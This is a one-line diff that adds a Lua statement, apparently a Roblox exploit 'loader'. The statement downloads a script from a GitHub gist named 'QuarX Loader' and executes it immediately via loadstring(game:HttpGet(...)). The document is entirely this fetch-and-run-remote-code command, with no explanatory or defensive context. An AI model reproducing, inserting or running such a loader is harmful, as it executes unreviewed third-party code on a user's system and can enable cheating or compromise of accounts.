@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://gist.githubusercontent.com/6Iphonee/8567fa4fa83e0ed6449da202ec450b19/raw/QuarX%2520Loader"))()
